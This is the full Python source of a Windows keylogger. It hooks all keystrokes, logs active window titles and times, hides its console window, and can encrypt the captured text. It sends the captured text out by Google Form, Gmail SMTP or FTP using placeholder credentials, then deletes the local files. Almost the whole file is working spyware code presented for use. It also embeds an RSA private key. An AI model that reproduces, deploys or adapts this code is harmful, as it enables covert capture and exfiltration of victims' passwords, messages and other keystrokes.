#!/usr/bin/env python
# -*- coding: utf-8 -*-

import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
import os                  # for handling paths and removing files (FTP mode)
import sys                 # for getting sys.argv
import win32event, \
       win32api, winerror  # for disallowing multiple instances
import win32console        # for getting the console window
import win32gui            # for getting window titles and hiding the console window
import ctypes              # for getting window titles, current keyboard layout and capslock state
import threading, smtplib  # for emailing logs
import ftplib              # for sending logs via FTP
import urllib              # for accessing Google Forms
import datetime            # for getting the current time and using timedelta
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA3_512
import base64
import getpass             # for securely entering a user's pass phrase to access the private key
import hashlib             # for hashing the names of files

# CONSTANTS
CHAR_LIMIT = 1000         # this many characters one should type to make the logger log the line_buffer.
MINUTES_TO_LOG_TIME = 5   # this many minutes should pass to log the current time.

# - GLOBAL SCOPE VARIABLES start -
# general check
if len(sys.argv) == 1:
    sys.argv = [sys.argv[0], 'debug']
mode = sys.argv[1]
encryption_on = True if 'encrypt' in sys.argv else False
reverse_encryption = False  # use True to decrypt back to be able to debug without turning the encryption off

line_buffer, window_name = '', ''
time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
count, backspace_buffer_len = 0, 0

# RSA KEYS FOR ENCRYPTION. Use the commands at the bottom of this script to generate a new key pair.
public_key_str = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt3bksLIIV7w2WPcVLMPH
l+dL6wMxSMiwxiK2a/wk2Ba0aQCpOZyPaJSAXbCl0kPU7NL9qBoBpKOD27MKl65m
BTIT45SDcUjJVUvHvueEIPmRhATQFEDE1id2OexNk7TWpm3us8KQUlPrUeviEMNN
jI4/z5lNcD6/YTjEZx+iQ3ERO5yyQJ1KX5GwFI91RfRPsSuswU3U7K7X1yM4KhHL
gafblBfh9GR3VEUv5g/DtKjiViVpcpV4hxzShq2or+QvzCngBk+ZPJg8+jH3PFgT
VBKf3WDs7x0fLco81wdqj3fIlTPAM29jtllvRIM7kvYVZVTI/sn8CckX158Dtim7
Hv5i3T4zGcONpRVn/9VK8NrIZyAvaDsQyTc7J0zdUY6tj3fTZXYvyWj9gBAh0leL
99f9CQR+rWd8E2ifrHdJ+ogn31UkXw7jfLvDWrOcThK+ZILK5Z9QCe9ZXJ9RzjSZ
oE9HAYRvBgbRASRvs4+lq37kLy+oJGunpp5tu5pBy2lS+eLEtRjYs86JPZ+rsEOw
2cPy5dCoowMxZnSXDJibBoa2uCXRrwupNZLtZ1jH6EdVdEqcyKjp9YUDkWn1tU1w
n8YpjZ0pK5rEUEubmjPSBzupYjj/eTuZONrED2mhcojPZX75UjQzsnWRLgfjSeec
4ireBJiz//vwQHVs2ZFSo18CAwEAAQ==
-----END PUBLIC KEY-----"""
public_key = bytes(public_key_str, 'utf-8')
# with open("public_key.pem", "rb") as f:
#     public_key = f.read()

# private key for testing purposes only!
private_key_str = """-----BEGIN PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,43A5A1A3E59DAC43

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
jov/2RKescJWOnXUg2kTHMnrsjYvtRjn
-----END PRIVATE KEY-----"""
private_key = bytes(private_key_str, 'utf-8')
# with open("private_key.pem", "rb") as f:
#     private_key = f.read()

# Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
             '0x401': 'Arabic - Saudi Arabia', '0x1401': 'Arabic - Algeria', '0x3c01': 'Arabic - Bahrain',
             '0x0c01': 'Arabic - Egypt', '0x801': 'Arabic - Iraq', '0x2c01': 'Arabic - Jordan',
             '0x3401': 'Arabic - Kuwait', '0x3001': 'Arabic - Lebanon', '0x1001': 'Arabic - Libya',
             '0x1801': 'Arabic - Morocco', '0x2001': 'Arabic - Oman', '0x4001': 'Arabic - Qatar',
             '0x2801': 'Arabic - Syria', '0x1c01': 'Arabic - Tunisia', '0x3801': 'Arabic - U.A.E.',
             '0x2401': 'Arabic - Yemen', '0x042b': 'Armenian - Armenia', '0x044d': 'Assamese',
             '0x082c': 'Azeri (Cyrillic)', '0x042c': 'Azeri (Latin)', '0x042d': 'Basque', '0x423': 'Belarusian',
             '0x445': 'Bengali (India)', '0x845': 'Bengali (Bangladesh)', '0x141A': 'Bosnian (Bosnia/Herzegovina)',
             '0x402': 'Bulgarian', '0x455': 'Burmese', '0x403': 'Catalan', '0x045c': 'Cherokee - United States',
             '0x804': "Chinese - People's Republic of China", '0x1004': 'Chinese - Singapore',
             '0x404': 'Chinese - Taiwan', '0x0c04': 'Chinese - Hong Kong SAR', '0x1404': 'Chinese - Macao SAR',
             '0x041a': 'Croatian', '0x101a': 'Croatian (Bosnia/Herzegovina)', '0x405': 'Czech', '0x406': 'Danish',
             '0x465': 'Divehi', '0x413': 'Dutch - Netherlands', '0x813': 'Dutch - Belgium', '0x466': 'Edo',
             '0x409': 'English - United States', '0x809': 'English - United Kingdom', '0x0c09': 'English - Australia',
             '0x2809': 'English - Belize', '0x1009': 'English - Canada', '0x2409': 'English - Caribbean',
             '0x3c09': 'English - Hong Kong SAR', '0x4009': 'English - India', '0x3809': 'English - Indonesia',
             '0x1809': 'English - Ireland', '0x2009': 'English - Jamaica', '0x4409': 'English - Malaysia',
             '0x1409': 'English - New Zealand', '0x3409': 'English - Philippines', '0x4809': 'English - Singapore',
             '0x1c09': 'English - South Africa', '0x2c09': 'English - Trinidad', '0x3009': 'English - Zimbabwe',
             '0x425': 'Estonian', '0x438': 'Faroese', '0x429': 'Farsi', '0x464': 'Filipino', '0x040b': 'Finnish',
             '0x040c': 'French - France', '0x080c': 'French - Belgium', '0x2c0c': 'French - Cameroon',
             '0x0c0c': 'French - Canada', '0x240c': 'French - Democratic Rep. of Congo', '0x300c':
                 "French - Cote d'Ivoire", '0x3c0c': 'French - Haiti', '0x140c': 'French - Luxembourg',
             '0x340c': 'French - Mali', '0x180c': 'French - Monaco', '0x380c': 'French - Morocco',
             '0xe40c': 'French - North Africa', '0x200c': 'French - Reunion', '0x280c': 'French - Senegal',
             '0x100c': 'French - Switzerland', '0x1c0c': 'French - West Indies', '0x462': 'Frisian - Netherlands',
             '0x467': 'Fulfulde - Nigeria', '0x042f': 'FYRO Macedonian', '0x083c': 'Gaelic (Ireland)',
             '0x043c': 'Gaelic (Scotland)', '0x456': 'Galician', '0x437': 'Georgian', '0x407': 'German - Germany',
             '0x0c07': 'German - Austria', '0x1407': 'German - Liechtenstein', '0x1007': 'German - Luxembourg',
             '0x807': 'German - Switzerland', '0x408': 'Greek', '0x474': 'Guarani - Paraguay', '0x447': 'Gujarati',
             '0x468': 'Hausa - Nigeria', '0x475': 'Hawaiian - United States', '0x040d': 'Hebrew', '0x439': 'Hindi',
             '0x040e': 'Hungarian', '0x469': 'Ibibio - Nigeria', '0x040f': 'Icelandic', '0x470': 'Igbo - Nigeria',
             '0x421': 'Indonesian', '0x045d': 'Inuktitut', '0x410': 'Italian - Italy',
             '0x810': 'Italian - Switzerland', '0x411': 'Japanese', '0x044b': 'Kannada', '0x471': 'Kanuri - Nigeria',
             '0x860': 'Kashmiri', '0x460': 'Kashmiri (Arabic)', '0x043f': 'Kazakh', '0x453': 'Khmer',
             '0x457': 'Konkani', '0x412': 'Korean', '0x440': 'Kyrgyz (Cyrillic)', '0x454': 'Lao', '0x476': 'Latin',
             '0x426': 'Latvian', '0x427': 'Lithuanian', '0x043e': 'Malay - Malaysia',
             '0x083e': 'Malay - Brunei Darussalam', '0x044c': 'Malayalam', '0x043a': 'Maltese', '0x458': 'Manipuri',
             '0x481': 'Maori - New Zealand', '0x044e': 'Marathi', '0x450': 'Mongolian (Cyrillic)',
             '0x850': 'Mongolian (Mongolian)', '0x461': 'Nepali', '0x861': 'Nepali - India',
             '0x414': 'Norwegian (Bokmål)', '0x814': 'Norwegian (Nynorsk)', '0x448': 'Oriya', '0x472': 'Oromo',
             '0x479': 'Papiamentu', '0x463': 'Pashto', '0x415': 'Polish', '0x416': 'Portuguese - Brazil',
             '0x816': 'Portuguese - Portugal', '0x446': 'Punjabi', '0x846': 'Punjabi (Pakistan)',
             '0x046B': 'Quecha - Bolivia', '0x086B': 'Quecha - Ecuador', '0x0C6B': 'Quecha - Peru',
             '0x417': 'Rhaeto-Romanic', '0x418': 'Romanian', '0x818': 'Romanian - Moldava', '0x419': 'Russian',
             '0x819': 'Russian - Moldava', '0x043b': 'Sami (Lappish)', '0x044f': 'Sanskrit', '0x046c': 'Sepedi',
             '0x0c1a': 'Serbian (Cyrillic)', '0x081a': 'Serbian (Latin)', '0x459': 'Sindhi - India',
             '0x859': 'Sindhi - Pakistan', '0x045b': 'Sinhalese - Sri Lanka', '0x041b': 'Slovak',
             '0x424': 'Slovenian', '0x477': 'Somali', '0x042e': 'Sorbian', '0x0c0a': 'Spanish - Spain (Modern Sort)',
             '0x040a': 'Spanish - Spain (Traditional Sort)', '0x2c0a': 'Spanish - Argentina',
             '0x400a': 'Spanish - Bolivia', '0x340a': 'Spanish - Chile', '0x240a': 'Spanish - Colombia',
             '0x140a': 'Spanish - Costa Rica', '0x1c0a': 'Spanish - Dominican Republic',
             '0x300a': 'Spanish - Ecuador', '0x440a': 'Spanish - El Salvador', '0x100a': 'Spanish - Guatemala',
             '0x480a': 'Spanish - Honduras', '0xe40a': 'Spanish - Latin America', '0x080a': 'Spanish - Mexico',
             '0x4c0a': 'Spanish - Nicaragua', '0x180a': 'Spanish - Panama', '0x3c0a': 'Spanish - Paraguay',
             '0x280a': 'Spanish - Peru', '0x500a': 'Spanish - Puerto Rico', '0x540a': 'Spanish - United States',
             '0x380a': 'Spanish - Uruguay', '0x200a': 'Spanish - Venezuela', '0x430': 'Sutu', '0x441': 'Swahili',
             '0x041d': 'Swedish', '0x081d': 'Swedish - Finland', '0x045a': 'Syriac', '0x428': 'Tajik',
             '0x045f': 'Tamazight (Arabic)', '0x085f': 'Tamazight (Latin)', '0x449': 'Tamil', '0x444': 'Tatar',
             '0x044a': 'Telugu', '0x041e': 'Thai', '0x851': 'Tibetan - Bhutan',
             '0x451': "Tibetan - People's Republic of China", '0x873': 'Tigrigna - Eritrea',
             '0x473': 'Tigrigna - Ethiopia', '0x431': 'Tsonga', '0x432': 'Tswana', '0x041f': 'Turkish',
             '0x442': 'Turkmen', '0x480': 'Uighur - China', '0x422': 'Ukrainian', '0x420': 'Urdu',
             '0x820': 'Urdu - India', '0x843': 'Uzbek (Cyrillic)', '0x443': 'Uzbek (Latin)', '0x433': 'Venda',
             '0x042a': 'Vietnamese', '0x452': 'Welsh', '0x434': 'Xhosa', '0x478': 'Yi', '0x043d': 'Yiddish',
             '0x046a': 'Yoruba', '0x435': 'Zulu', '0x04ff': 'HID (Human Interface Device)'}

latin_into_cyrillic = (u"`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                       u"qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                       u"~`{[}]:;\"'|<,>.?/@#$^&",
                       u"ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                       u"йцукенгшщзхъфывапролджэячсмитьбю." +
                       u"ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?")   # LATIN - CYRILLIC keyboard mapping
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])   # CYRILLIC - LATIN keyboard mapping

latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarusian', 'Kazakh',
                              'Kyrgyz (Cyrillic)', 'Mongolian (Cyrillic)', 'Tajik', 'Tatar', 'Serbian (Cyrillic)',
                              'Ukrainian', 'Uzbek (Cyrillic)']

full_path = os.path.dirname(os.path.realpath(sys.argv[0]))

# Determine the initial keyboard layout - to fix the keyboard module bug.


def detect_key_layout():
    global lcid_dict
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    # made up of 0xAAABBBB, AAA = HKL (handle object) & BBBB = language ID
    # Language ID -> low 10 bits, Sub-language ID -> high 6 bits
    # Extract language ID from KLID
    lid = klid & (2 ** 16 - 1)
    # Convert language ID from decimal to hexadecimal
    lid_hex = hex(lid)
    try:
        language = lcid_dict[str(lid_hex)]
    except KeyError:
        language = lcid_dict['0x409']  # English - United States
    return language


initial_language = detect_key_layout()

# - GLOBAL SCOPE VARIABLES end -

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple instance not allowed")
    exit(0)


def get_capslock_state():
    # using the answer here https://stackoverflow.com/a/21160382
    import ctypes
    hll_dll = ctypes.WinDLL("User32.dll")
    vk = 0x14
    return True if hll_dll.GetKeyState(vk) == 1 else False


shift_on = False   # an assumption, GetKeyState doesn't work
capslock_on = get_capslock_state()


def update_upper_case():
    global capslock_on, shift_on
    if (capslock_on and not shift_on) or (not capslock_on and shift_on):
        res = True
    else:
        res = False
    return res


upper_case = update_upper_case()


def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def decrypt(encrypted_blob, passphrase=None):
    # Debug only, don't decrypt in production. Decrypt on your own.
    global private_key
    key = RSA.importKey(private_key, passphrase)
    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
    # Base 64 decode the data
    encrypted_blob = base64.b64decode(encrypted_blob)
    decrypted_message = cipher.decrypt(encrypted_blob)
    del key, cipher  # do at least this as soon as possible
    return decrypted_message


def decrypt_many(encrypted, passphrase=None):
    if passphrase == '':
        passphrase = None
    delimiter = '---END---'
    if isinstance(encrypted, bytes):
        encrypted = encrypted.decode('utf-8')
    # remove the line breaks and ---START---
    encrypted = encrypted.replace('\n', '')
    encrypted = encrypted.replace('---START---', '')
    encrypted_split = encrypted.split(delimiter)
    # filter the empty elements
    encrypted_messages = [k for k in encrypted_split if len(k) > 0]
    # decrypt each message
    decrypted_blob = '\n'.join([decrypt(bytes(m, 'utf-8'), passphrase).decode('utf-8') for m in encrypted_messages])
    return decrypted_blob


def encrypt(message_str):
    global public_key
    # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP).
    # See https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Cipher.PKCS1_OAEP-module.html
    key = RSA.importKey(public_key)
    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
    message = bytes(message_str, 'utf-8')
    # Use the public key for encryption
    ciphertext = cipher.encrypt(message)
    del key
    # Base 64 encode the encrypted message
    encrypted_message = base64.b64encode(ciphertext)
    return encrypted_message


def log_local():
    # Local mode
    global full_path, line_buffer, backspace_buffer_len
    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
    # md5 only for masking dates - it's easily crackable:
    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
    try:
        with open(os.path.join(full_path, todays_date_hashed + ".txt"), "a") as fp:
            fp.write(line_buffer)
    except Exception as e:
        print(e)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_remote():
    # Remote mode - Google Form logs post
    global line_buffer, backspace_buffer_len
    url = "https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Specify Google Form URL here
    klog = {'entry.xxxxxxxxxxx': line_buffer}  # Specify the Field Name here
    try:
        dataenc = urllib.parse.urlencode(klog)
        req = urllib.Request(url, dataenc)
        response = urllib.request.urlopen(req)
        line_buffer, backspace_buffer_len = '', 0
    except Exception as e:
        print(e)
    return True


class TimerClass(threading.Thread):
    # Email mode
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        while not self.event.is_set():
            global line_buffer, backspace_buffer_len
            ts = datetime.datetime.now()
            SERVER = "smtp.gmail.com"  # Specify Server Here
            PORT = 587  # Specify Port Here
            USER = "your_email@gmail.com"  # Specify Username Here
            PASS = "password_here"  # Specify Password Here
            FROM = USER  # From address is taken from username
            TO = ["to_address@gmail.com"]  # Specify to address.Use comma if more than one to address is needed.
            SUBJECT = "Keylogger data: " + str(ts)
            MESSAGE = line_buffer
            message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message)
                line_buffer, backspace_buffer_len = '', 0
                server.quit()
            except Exception as e:
                print(e)
            self.event.wait(120)


def log_ftp():
    # FTP mode - Upload logs to FTP account
    global line_buffer, count, backspace_buffer_len
    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
    # md5 only for masking dates - it's easily crackable:
    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
    count += 1
    FILENAME = todays_date_hashed + "-" + str(count) + ".txt"
    try:
        with open(FILENAME, "a") as fp:
            fp.write(line_buffer)
    except Exception as e:
        print(e)
    line_buffer, backspace_buffer_len = '', 0
    try:
        SERVER = "ftp.xxxxxx.com"   # Specify your FTP Server address
        USERNAME = "ftp_username"   # Specify your FTP Username
        PASSWORD = "ftp_password"   # Specify your FTP Password
        SSL = 1                     # Set 1 for SSL and 0 for normal connection
        OUTPUT_DIR = "/"            # Specify output directory here
        if SSL == 0:
            ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
        else:
            ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
        ft.cwd(OUTPUT_DIR)
        with open(FILENAME, 'rb') as fp:
            cmd = 'STOR' + ' ' + FILENAME
            ft.storbinary(cmd, fp)
            ft.quit()
        os.remove(FILENAME)
    except Exception as e:
        print(e)
    return True


def log_debug():
    # Debug mode
    global line_buffer, backspace_buffer_len
    print(line_buffer)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_it():
    global mode, line_buffer, encryption_on, reverse_encryption
    if encryption_on:
        line_buffer = encrypt(line_buffer).decode('utf-8')
        if reverse_encryption:
            line_buffer = decrypt(line_buffer).decode('utf-8')
        else:
            line_buffer = '\n---START---' + line_buffer + '---END---\n'
    if mode == "local":
        log_local()
    elif mode == "remote":
        log_remote()
    elif mode == "email":
        email = TimerClass()
        email.start()
    elif mode == "ftp":
        log_ftp()
    elif mode == 'debug':
        log_debug()
    return True


if __name__ == '__main__':
    if not sys.argv[1] == "debug":
        hide()


def key_callback(event):
    global line_buffer, window_name, time_logged, upper_case, capslock_on, shift_on, backspace_buffer_len

    if event.event_type == 'up':
        if event.name in ['shift', 'right shift']:  # SHIFT UP
            shift_on = False
            upper_case = update_upper_case()
        return True

    window_buffer, time_buffer = '', ''

    # 1. Detect the active window change - if so, LOG THE WINDOW NAME
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    event_window_name = win32gui.GetWindowText(curr_window)
    if window_name != event_window_name:
        window_buffer = '\n[WindowName: ' + event_window_name + ']: '                 # update the line_buffer
        window_name = event_window_name                                               # set the new value

    # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
    now = datetime.datetime.now()
    if now - time_logged > datetime.timedelta(minutes=MINUTES_TO_LOG_TIME):
        time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '  # update the line_buffer
        time_logged = now                                                           # set the new value

    if time_buffer != "" or window_buffer != "":
        if line_buffer != "":
            log_it()                                    # log anything from old window / times
        line_buffer = time_buffer + window_buffer       # value to begin with
        """ backspace_buffer_len = the number of symbols of line_buffer up until the last technical tag (including it) 
         - window name, time or key tags (<BACKSPACE>, etc.).
        len(line_buffer) - backspace_buffer_len = the number of symbols that we can safely backspace.
        we increment backspace_buffer_len variable only when we append technical stuff
        (time_buffer or window_buffer or <KEYS>): """
        backspace_buffer_len = len(line_buffer)

    key_pressed = ''

    # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
    if event.name in ['left', 'right', 'up', 'down', 'home', 'end']:  # arrow keys
        key_pressed_list = list()
        if keyboard.is_pressed('ctrl') or keyboard.is_pressed('right ctrl'):
            key_pressed_list.append('ctrl')
        if keyboard.is_pressed('shift') or keyboard.is_pressed('right shift'):
            key_pressed_list.append('shift')
        key_pressed = '<' + '+'.join(key_pressed_list) + ('+' if len(key_pressed_list) > 0 else '') + event.name + '>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
    elif event.name == 'space':
        key_pressed = ' '
    elif event.name in ['enter', 'tab']:
        key_pressed = '<TAB>' if event.name == 'tab' else '<ENTER>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
        log_it()    # pass event to other handlers
        return True
    elif event.name == 'backspace':
        if len(line_buffer) - backspace_buffer_len > 0:
            line_buffer = line_buffer[:-1]               # remove the last character
        else:
            line_buffer += '<BACKSPACE>'
            backspace_buffer_len = len(line_buffer)
    elif event.name == 'caps lock':                      # CAPS LOCK
        upper_case = not upper_case
        capslock_on = not capslock_on
    elif event.name in ['shift', 'right shift']:         # SHIFT DOWN
        shift_on = True
        upper_case = update_upper_case()
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            # if some normal character
            # 3.1. DETERMINE THE SELECTED LANGUAGE AND TRANSLATE THE KEYS IF NEEDED
            # There is a keyboard module bug: when we start a program in one layout and then switch to another,
            # the layout of hooked input DOES NOT change. So we need a workaround.
            language = detect_key_layout()
            global latin_into_cyrillic_trantab, cyrillic_layouts
            if 'English' in language and 'English' not in initial_language:
                # cyrillic -> latin reverse translation is required
                if ord(key_pressed) in cyrillic_into_latin_trantab:
                    key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
            elif language in cyrillic_layouts and initial_language not in cyrillic_layouts:
                # latin -> cyrillic translation is required
                if ord(key_pressed) in latin_into_cyrillic_trantab:
                    key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

            # apply upper or lower case
            key_pressed = key_pressed.upper() if upper_case else key_pressed.lower()
        else:
            # unknown character (eg arrow key, shift, ctrl, alt)
            return True  # pass event to other handlers

    # 4. APPEND THE PRESSED KEY TO THE LINE_BUFFER
    line_buffer += key_pressed

    # 5. DECIDE ON WHETHER TO LOG CURRENT line_buffer OR NOT:
    if len(line_buffer) >= CHAR_LIMIT:
        log_it()
    return True  # pass event to other handlers


keyboard.hook(key_callback)
keyboard.wait()
